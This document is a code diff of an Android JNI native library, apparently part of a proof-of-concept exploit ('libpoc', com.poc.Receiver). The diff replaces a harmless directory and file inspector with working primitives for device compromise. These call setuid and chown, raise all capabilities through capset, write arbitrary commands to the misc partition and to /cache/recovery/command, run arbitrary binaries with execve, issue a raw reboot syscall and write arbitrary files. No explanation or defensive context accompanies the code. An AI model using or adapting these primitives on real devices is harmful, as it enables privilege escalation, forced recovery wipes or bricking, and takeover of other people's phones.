@@ -1,102 +1,121 @@
 #include <jni.h>
-#include <android/log.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
-#include <errno.h>
-#include <dirent.h>
-#include <sys/stat.h>
 #include <unistd.h>
+#include <errno.h>
 #include <fcntl.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/capability.h>
+#include <linux/reboot.h>
+#include <android/log.h>
 
-#define LOG_TAG "NativeInspector"
+#define LOG_TAG "libpoc"
 #define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
-#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
 
-JNIEXPORT jobjectArray JNICALL
-Java_com_poc_Main_nativeListDirectory(JNIEnv *env, jclass clazz, jstring path) {
-    const char *path_str = (*env)->GetStringUTFChars(env, path, NULL);
-    if (path_str == NULL) return NULL;
-
-    DIR *dir = opendir(path_str);
-    if (dir == NULL) {
-        LOGE("opendir(%s) failed: %s (%d)", path_str, strerror(errno), errno);
-        (*env)->ReleaseStringUTFChars(env, path, path_str);
-        return NULL;
-    }
-
-    struct dirent *entry;
-    int count = 0;
-    while ((entry = readdir(dir)) != NULL) count++;
-    rewinddir(dir);
-
-    jclass stringClass = (*env)->FindClass(env, "java/lang/String");
-    jobjectArray result = (*env)->NewObjectArray(env, count, stringClass, NULL);
-
-    int idx = 0;
-    char full_path[1024];
-    struct stat st;
-    while ((entry = readdir(dir)) != NULL) {
-        snprintf(full_path, sizeof(full_path), "%s/%s", path_str, entry->d_name);
-        if (stat(full_path, &st) == -1) {
-            char buf[512];
-            snprintf(buf, sizeof(buf), "%s|unknown|0|0", entry->d_name);
-            jobject str = (*env)->NewStringUTF(env, buf);
-            (*env)->SetObjectArrayElement(env, result, idx, str);
-            idx++;
-            continue;
-        }
-
-        char type = 'F';
-        if (S_ISDIR(st.st_mode)) type = 'D';
-        else if (S_ISLNK(st.st_mode)) type = 'L';
-        else if (S_ISBLK(st.st_mode)) type = 'B';
-        else if (S_ISCHR(st.st_mode)) type = 'C';
-        else if (S_ISFIFO(st.st_mode)) type = 'P';
-        else if (S_ISSOCK(st.st_mode)) type = 'S';
-
-        int perms = st.st_mode & 0777;
-
-        char buf[512];
-        snprintf(buf, sizeof(buf), "%s|%c|%ld|%03o", entry->d_name, type, (long)st.st_size, perms);
-        jobject str = (*env)->NewStringUTF(env, buf);
-        (*env)->SetObjectArrayElement(env, result, idx, str);
-        idx++;
-    }
-
-    closedir(dir);
-    (*env)->ReleaseStringUTFChars(env, path, path_str);
-    return result;
+static int syscall_ret(int ret) {
+    if (ret < 0) return -errno;
+    return ret;
 }
 
-JNIEXPORT jstring JNICALL
-Java_com_poc_Main_nativeReadFile(JNIEnv *env, jclass clazz, jstring path) {
-    const char *path_str = (*env)->GetStringUTFChars(env, path, NULL);
-    if (path_str == NULL) return NULL;
+JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1setuid(JNIEnv *env, jclass clazz, jint uid) {
+    int ret = syscall(__NR_setuid, uid);
+    return syscall_ret(ret);
+}
 
-    int fd = open(path_str, O_RDONLY);
+JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1chown(JNIEnv *env, jclass clazz, jstring path, jint uid, jint gid) {
+    const char *cpath = (*env)->GetStringUTFChars(env, path, NULL);
+    int ret = syscall(__NR_chown, cpath, uid, gid);
+    (*env)->ReleaseStringUTFChars(env, path, cpath);
+    return syscall_ret(ret);
+}
+
+JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1write_1misc(JNIEnv *env, jclass clazz, jstring cmd) {
+    const char *ccmd = (*env)->GetStringUTFChars(env, cmd, NULL);
+    int fd = open("/dev/block/by-name/misc", O_RDWR);
     if (fd < 0) {
-        LOGE("open(%s) failed: %s", path_str, strerror(errno));
-        (*env)->ReleaseStringUTFChars(env, path, path_str);
-        return (*env)->NewStringUTF(env, "");
+        fd = open("/dev/block/misc", O_RDWR);
     }
-
-    char buffer[1025];
-    ssize_t bytes = read(fd, buffer, 1024);
+    if (fd < 0) {
+        (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
+        return -errno;
+    }
+    off_t off = lseek(fd, 0, SEEK_SET);
+    if (off < 0) {
+        close(fd);
+        (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
+        return -errno;
+    }
+    ssize_t written = write(fd, ccmd, strlen(ccmd));
     close(fd);
+    (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
+    return (written > 0) ? 0 : -errno;
+}
 
-    if (bytes <= 0) {
-        (*env)->ReleaseStringUTFChars(env, path, path_str);
-        return (*env)->NewStringUTF(env, "");
+JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1write_1recovery_1command(JNIEnv *env, jclass clazz, jstring cmd) {
+    const char *ccmd = (*env)->GetStringUTFChars(env, cmd, NULL);
+    int fd = open("/cache/recovery/command", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd < 0) {
+        (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
+        return -errno;
     }
+    ssize_t written = write(fd, ccmd, strlen(ccmd));
+    close(fd);
+    (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
+    return (written > 0) ? 0 : -errno;
+}
 
-    buffer[bytes] = '\0';
-    for (int i = 0; i < bytes; i++) {
-        if (buffer[i] < 0x20 && buffer[i] != '\n' && buffer[i] != '\t') {
-            buffer[i] = '.';
-        }
+JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1execve(JNIEnv *env, jclass clazz, jstring cmd, jobjectArray args) {
+    const char *ccmd = (*env)->GetStringUTFChars(env, cmd, NULL);
+    int argc = (*env)->GetArrayLength(env, args);
+    char **argv = malloc((argc + 2) * sizeof(char *));
+    if (!argv) {
+        (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
+        return -ENOMEM;
     }
-    jstring result = (*env)->NewStringUTF(env, buffer);
-    (*env)->ReleaseStringUTFChars(env, path, path_str);
-    return result;
+    argv[0] = (char *)ccmd;
+    for (int i = 0; i < argc; i++) {
+        jstring str = (jstring)(*env)->GetObjectArrayElement(env, args, i);
+        const char *cstr = (*env)->GetStringUTFChars(env, str, NULL);
+        argv[i+1] = (char *)cstr;
+        (*env)->ReleaseStringUTFChars(env, str, cstr);
+    }
+    argv[argc+1] = NULL;
+    int ret = execve(ccmd, argv, NULL);
+    free(argv);
+    (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
+    return syscall_ret(ret);
+}
+
+JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1reboot_1syscall(JNIEnv *env, jclass clazz, jint magic, jint magic2, jint cmd) {
+    int ret = syscall(__NR_reboot, magic, magic2, cmd);
+    return syscall_ret(ret);
+}
+
+JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1capset(JNIEnv *env, jclass clazz) {
+    struct __user_cap_header_struct header = { _LINUX_CAPABILITY_VERSION_3, 0 };
+    struct __user_cap_data_struct data[2] = { {0, 0, 0}, {0, 0, 0} };
+    int ret = syscall(__NR_capget, &header, data);
+    if (ret < 0) return -errno;
+    data[0].permitted = data[0].effective = 0xffffffff;
+    data[1].permitted = data[1].effective = 0xffffffff;
+    ret = syscall(__NR_capset, &header, data);
+    return syscall_ret(ret);
+}
+
+JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1open_1write(JNIEnv *env, jclass clazz, jstring path, jstring data) {
+    const char *cpath = (*env)->GetStringUTFChars(env, path, NULL);
+    const char *cdata = (*env)->GetStringUTFChars(env, data, NULL);
+    int fd = open(cpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd < 0) {
+        (*env)->ReleaseStringUTFChars(env, path, cpath);
+        (*env)->ReleaseStringUTFChars(env, data, cdata);
+        return -errno;
+    }
+    ssize_t written = write(fd, cdata, strlen(cdata));
+    close(fd);
+    (*env)->ReleaseStringUTFChars(env, path, cpath);
+    (*env)->ReleaseStringUTFChars(env, data, cdata);
+    return (written > 0) ? 0 : -errno;
 }
